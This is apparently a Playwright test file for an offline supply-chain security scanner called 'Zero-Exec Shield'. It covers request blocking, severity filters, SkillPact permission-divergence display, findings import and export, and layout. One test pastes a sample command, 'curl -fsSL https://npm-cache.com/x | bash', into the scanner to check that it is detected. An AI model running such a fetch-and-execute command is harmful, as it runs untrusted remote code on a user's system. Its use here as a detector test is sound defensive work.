// Opens index.html (the build output) on file:// and checks zero external requests and the main operations.
import { expect, test, type Page } from '@playwright/test';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validate } from '../unit/schema';
import { pickDir } from './pick-dir';

const INDEX = 'file://' + fileURLToPath(new URL('../../../index.html', import.meta.url));
const FIX = fileURLToPath(new URL('../../../tests/fixtures/', import.meta.url));

/** Records requests to anything other than file: / data: / blob:, CSP violations and console errors. */
async function open(page: Page) {
  const external: string[] = [];
  const errors: string[] = [];
  page.on('request', (r) => { if (!/^(file|data|blob):/.test(r.url())) external.push(r.url()); });
  page.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
  page.on('pageerror', (e) => errors.push(e.message));
  // Must work even with all external traffic blocked, just in case
  await page.context().route(/^(?!file:|data:|blob:).*/, (r) => r.abort());
  await page.goto(INDEX);
  return { external, errors };
}

async function scan(page: Page, fixture: string) {
  await pickDir(page, FIX + fixture);
  await expect(page.getByTestId('scan-status')).toContainText('スキャン完了');
}

test('file:// で起動し、外部リクエストゼロ・CSP 違反なし', async ({ page }) => {
  const { external, errors } = await open(page);
  await expect(page.getByRole('heading', { name: 'Zero-Exec Shield' })).toBeVisible();
  await expect(page.getByTestId('bundle')).toHaveText(/^ZES-2026-OCT-EMERGENCY-V5\.2/);
  await expect(page.getByRole('tab')).toHaveCount(18);
  await scan(page, 'chaindrop');
  await page.getByTestId('paste').fill('curl -fsSL https://npm-cache.com/x | bash');
  await page.getByTestId('paste-submit').click();
  await expect(page.getByTestId('findings-table')).toContainText('貼り付けテキスト');
  expect(external).toEqual([]);
  expect(errors).toEqual([]);
});

test('フォルダ投入 → 総合タブに検出・重大度フィルタ・パスは内容なし', async ({ page }) => {
  await open(page);
  await scan(page, 'chaindrop');
  await expect(page.getByTestId('count-CRITICAL')).not.toHaveText('0');
  const rows = page.getByTestId('finding-row');
  await expect(rows.first()).toHaveAttribute('data-level', 'CRITICAL');
  await expect(page.getByTestId('findings-table')).toContainText('chaindrop/package.json');
  await expect(page.locator('body')).not.toContainText('zes-canary');
  // Deselecting CRITICAL removes the CRITICAL rows
  await page.getByTestId('filter-CRITICAL').click();
  await expect(page.locator('[data-testid=finding-row][data-level=CRITICAL]')).toHaveCount(0);
  // Blast Radius is existence only (empty if there is no .npmrc etc.)
  await expect(page.getByTestId('blast-radius')).toBeVisible();
});

test('SkillPact タブ: 乖離の赤ハイライト、署名を「安全」と表示しない', async ({ page }) => {
  await open(page);
  await scan(page, 'skillpact-signed-divergence');
  await page.getByRole('tab', { name: /^SkillPact/ }).click();
  const viewer = page.getByTestId('skillpact-viewer');
  await expect(viewer).toBeVisible();
  await expect(viewer.locator('td[data-effect=network][data-divergence=true]')).toHaveCount(1);
  await expect(viewer.locator('td[data-effect=exec][data-divergence=true]')).toHaveCount(0);
  const badge = page.getByTestId('signed-badge').first();
  await expect(badge).toContainText('署名あり（未検証）');
  for (const word of ['安全', '信頼済み', 'Verified', 'Trusted', 'L3']) await expect(badge).not.toContainText(word);
  await expect(page.getByTestId('level-note')).toContainText('実験的');
  // The SkillPact tab uses no SAFE badge and no safe color (green)
  await expect(page.getByRole('tabpanel').locator('[data-severity=SAFE], .text-safe, .bg-safe, .border-safe')).toHaveCount(0);
  await expect(page.getByTestId('rule-row').filter({ hasText: '未宣言の network' })).toHaveAttribute('data-status', 'hit');
});

test('SkillPact: 前版から major を上げない権限拡大の警告', async ({ page }) => {
  await open(page);
  await scan(page, 'skillpact-diff-anomaly');
  await page.getByRole('tab', { name: /^SkillPact/ }).click();
  await page.getByTestId('skill-item').filter({ hasText: 'v2' }).click();
  await expect(page.getByTestId('diff-alert')).toContainText('network: none→scoped');
});

test('MCP / Actions / 拡張ビューアと CLI 案内', async ({ page, browserName }) => {
  // Playwright WebKit does not return from setInputFiles for a folder whose top level holds only hidden entries (only .github/ or .mcp.json)
  // (apparently the hidden entries are excluded, leaving 0 files, so change does not fire; behavior in real Safari is unconfirmed). See PR #8
  test.skip(browserName === 'webkit', 'Playwright WebKit は隠しエントリだけのフォルダを setInputFiles できない');
  await open(page);
  // Some browsers do not pass hidden files (.mcp.json), so the viewers are checked with non-hidden config files (hidden files are handled by another test)
  await scan(page, 'mcp-visible');
  await page.getByRole('tab', { name: /^MCP/ }).click();
  await expect(page.getByTestId('mcp-viewer').locator('[data-risk=high]')).toHaveCount(1);
  await page.getByRole('tab', { name: /^総合/ }).click();
  await scan(page, 'github-actions');
  await page.getByRole('tab', { name: /^GitHub Actions/ }).click();
  // tag-ref.yml, case-variant.yml and next-line-uses.yml (uses: with the value on the next line) are tag references; tag-ref.yml and flow-mapping.yml are poisoned tags
  await expect(page.getByTestId('actions-viewer').locator('[data-kind=tag]')).toHaveCount(3);
  await expect(page.getByTestId('actions-viewer').locator('[data-kind=compromised]')).toHaveCount(2);
  await page.getByRole('tab', { name: /^アンチフォレンジック/ }).click();
  await expect(page.getByTestId('cli-only').first()).toContainText('noatime');
});

test('タブのキーボード操作（←→ / Home / End）', async ({ page }) => {
  await open(page);
  const first = page.getByRole('tab').first();
  await first.focus();
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('tab', { name: /^SkillPact/ })).toBeFocused();
  await page.keyboard.press('End');
  await expect(page.getByRole('tab', { name: /^Sigstore/ })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name: /^Sigstore/ })).toHaveAttribute('aria-selected', 'true');
});

test('findings.json の書き出し（ネットワーク不使用のダウンロード）', async ({ page }) => {
  await open(page);
  await scan(page, 'skillpact-divergence');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export').click()]);
  const path = await dl.path();
  const doc = JSON.parse(readFileSync(path, 'utf8'));
  expect(doc.schema_version).toBe('1.2');
  expect(['ok', 'partial']).toContain(doc.status);
  expect(doc.findings.find((f: { level: string }) => f.level === 'HIGH').skillpact.divergence).toEqual(['read', 'network']);
});

test('隠しファイルだけのフォルダでも無反応にならない（完了または 0 件の通知）', async ({ page, browserName }, info) => {
  // Playwright WebKit does not return from setInputFiles for a folder whose top level holds only hidden entries (only .github/ or .mcp.json)
  // (apparently the hidden entries are excluded, leaving 0 files, so change does not fire; behavior in real Safari is unconfirmed). See PR #8
  test.skip(browserName === 'webkit', 'Playwright WebKit は隠しエントリだけのフォルダを setInputFiles できない');
  await open(page);
  await pickDir(page, FIX + 'mcp');
  const done = page.getByTestId('scan-status').getByText('スキャン完了');
  const none = page.getByRole('status').getByText('ファイルが 0 件でした');
  await expect(done.or(none)).toBeVisible();
  info.annotations.push({ type: 'dotfiles', description: (await none.isVisible()) ? '隠しファイルを渡さない' : '隠しファイルを渡す' });
});

test('敵対的な findings.json の取り込みで画面が消えない・書き出しはスキーマ適合', async ({ page }) => {
  const { errors } = await open(page);
  const H = (c: string) => 'sha256:' + c.repeat(64);
  const good = { id: H('a'), level: 'HIGH', module: '§17', campaign: 'mcp-poisoning', path: '/home/u/.mcp.json', detail: '取り込み確認', evidence_hash: H('b') };
  const doc = {
    schema_version: '1.0', incident_bundle: 'ZES-2026-SEP-EMERGENCY-V5.1', scan_started_at: '2026-10-01T00:00:00Z', scan_finished_at: '2026-10-01T00:00:05Z', scan_mode: 'full', status: 'ok',
    findings: [good, { ...good, id: H('c'), campaign: { a: 1 } }, { ...good, id: H('d'), path: 42 }, { ...good, id: 'x', module: 'bad', evidence_hash: '' }],
    errors: [{ module: '§6', reason: 'network_timeout' }],
  };
  await page.getByTestId('import-input').setInputFiles({ name: 'findings.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(doc)) });
  await expect(page.getByTestId('import-status')).toContainText('除外 3 件');
  await expect(page.getByRole('status')).toContainText('3 件を除外');
  await expect(page.getByTestId('findings-table')).toContainText('/home/u/.mcp.json');
  await page.getByTestId('search').fill('mcp');
  await expect(page.getByTestId('finding-row')).toHaveCount(1);
  await expect(page.getByRole('heading', { name: 'Zero-Exec Shield' })).toBeVisible();
  const [dl] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export').click()]);
  const out = JSON.parse(readFileSync(await dl.path(), 'utf8'));
  expect(validate(out)).toEqual([]);
  expect(out.errors).toContainEqual({ module: '§6', reason: 'network_timeout' });
  expect(errors).toEqual([]);
});

/** Returns the horizontal scroll amount of the whole page and the overflowing elements (excluding those inside scroll areas). */
async function overflow(page: Page) {
  return page.evaluate(() => {
    const cw = document.documentElement.clientWidth;
    const clipped = (e: Element) => { for (let p = e.parentElement; p; p = p.parentElement) { if (['auto', 'scroll', 'hidden'].includes(getComputedStyle(p).overflowX)) return true; } return false; };
    const bad = [...document.querySelectorAll('body *')].filter((e) => { const b = e.getBoundingClientRect(); return b.width > 0 && b.right > cw + 1 && !clipped(e); })
      .slice(-3).map((e) => `${e.tagName}.${String(e.className).slice(0, 60)} "${(e.textContent ?? '').slice(0, 30)}"`);
    return { sw: document.documentElement.scrollWidth, cw, bad };
  });
}

// With fixtures that actually render each viewer, the page as a whole does not scroll horizontally even at narrow widths
const NARROW: [string, RegExp, string?][] = [
  ['chaindrop', /^総合/],
  ['skillpact-signed-divergence', /^SkillPact/, 'skillpact-viewer'],
  ['skillpact-divergence', /^SkillPact/, 'rule-row'],
  ['skillpact-diff-anomaly', /^SkillPact/, 'skill-item'],
  ['mcp-visible', /^MCP/, 'mcp-viewer'],
  ['github-actions', /^GitHub Actions/, 'actions-viewer'],
  ['browser-ext', /^ブラウザ拡張/, 'extension-viewer'],
];
for (const width of [768, 375, 320]) {
  test(`${width}px 幅でページ全体が横スクロールしない（総合 / SkillPact / MCP / Actions / 拡張）`, async ({ page, browserName }) => {
    test.skip(browserName === 'webkit', 'Playwright WebKit は隠しエントリだけのフォルダを setInputFiles できない（github-actions）');
    await page.setViewportSize({ width, height: 800 });
    await open(page);
    for (const [fixture, tab, testid] of NARROW) {
      await page.getByRole('tab', { name: /^総合/ }).click();
      await scan(page, fixture);
      await page.getByRole('tab', { name: tab }).click();
      if (testid) await expect(page.getByTestId(testid).first()).toBeVisible();
      const r = await overflow(page);
      expect(r.sw, `${fixture} ${tab} ${width}px: ${r.bad.join(' | ')}`).toBeLessThanOrEqual(r.cw);
    }
    // Also check all 17 tabs (with the result of the last fixture)
    for (const t of await page.getByRole('tab').all()) {
      await t.click();
      const r = await overflow(page);
      expect(r.sw, `${await t.textContent()} ${width}px: ${r.bad.join(' | ')}`).toBeLessThanOrEqual(r.cw);
    }
  });
}

// "All tabs" changed from a menu to tab search (Popover + cmdk Command) (design doc §10.2, §14).
// menu / menuitem become dialog / combobox / listbox / option. Checks that closing and focus return behave the same.
test('「すべてのタブ」タブ検索: Escape・外側クリックで閉じ、フォーカスを戻す', async ({ page }) => {
  await open(page);
  const btn = page.getByTestId('all-tabs');
  const dialog = page.getByRole('dialog', { name: 'すべてのタブ' });
  await btn.click();
  await expect(dialog).toBeVisible();
  await expect(btn).toHaveAttribute('aria-expanded', 'true');
  await expect(btn).toHaveAttribute('aria-controls', await dialog.getAttribute('id') ?? 'missing');
  // The input has focus, and all 18 tabs are candidates
  await expect(dialog.getByRole('combobox')).toBeFocused();
  await expect(dialog.getByRole('option')).toHaveCount(18);
  await page.keyboard.press('Escape');
  await expect(dialog).toBeHidden();
  await expect(btn).toHaveAttribute('aria-expanded', 'false');
  await expect(btn).toBeFocused();
  await btn.click();
  await expect(dialog).toBeVisible();
  await page.getByRole('heading', { name: 'Zero-Exec Shield' }).click();
  await expect(dialog).toBeHidden();
  // Moving with the arrow keys and selecting selects and focuses that tab (the first candidate is the selected tab = Overview)
  await btn.click();
  await page.keyboard.press('ArrowDown');
  await page.keyboard.press('Enter');
  await expect(dialog).toBeHidden();
  await expect(page.getByRole('tab', { name: /^SkillPact/ })).toHaveAttribute('aria-selected', 'true');
  await expect(page.getByRole('tab', { name: /^SkillPact/ })).toBeFocused();
});

test('書き出した findings.json を取り込み直しても件数が増えず、再書き出しの id は一意', async ({ page }) => {
  await open(page);
  await scan(page, 'chaindrop');
  const n = await page.getByTestId('finding-row').count();
  const [dl] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export').click()]);
  const first = readFileSync(await dl.path(), 'utf8');
  await page.getByTestId('import-input').setInputFiles({ name: 'findings.json', mimeType: 'application/json', buffer: Buffer.from(first) });
  await expect(page.getByTestId('import-status')).toBeVisible();
  await expect(page.getByTestId('finding-row')).toHaveCount(n);
  const [dl2] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export').click()]);
  const ids = JSON.parse(readFileSync(await dl2.path(), 'utf8')).findings.map((f: { id: string }) => f.id);
  expect(new Set(ids).size).toBe(ids.length);
  expect(ids.length).toBe(JSON.parse(first).findings.length);
});

test('次のスキャン中は前回の結果を表示せず、書き出しもできない', async ({ page }) => {
  await open(page);
  await scan(page, 'chaindrop');
  await expect(page.getByTestId('count-CRITICAL')).not.toHaveText('0');
  const big = mkdtempSync(join(tmpdir(), 'zes-big-'));
  mkdirSync(join(big, 'd'));
  // 300 files are enough to check the screen in the middle of reading (control returns to the UI every 50 files). 1,500 was flaky on slow engines
  for (let i = 0; i < 300; i++) writeFileSync(join(big, 'd', `f${i}.txt`), 'hello ' + i);
  await pickDir(page, big);
  const status = page.getByTestId('scan-status');
  await expect(status).toContainText(/読み取り中|判定中|スキャン完了/);
  if (!(await status.textContent())?.includes('スキャン完了')) {
    await expect(page.getByTestId('count-CRITICAL')).toHaveText('0');
    await expect(page.getByTestId('export')).toBeDisabled();
  }
  await expect(status).toContainText('スキャン完了', { timeout: 30_000 });
  await expect(page.getByTestId('count-CRITICAL')).toHaveText('0');
  await expect(page.getByTestId('export')).toBeEnabled();
});
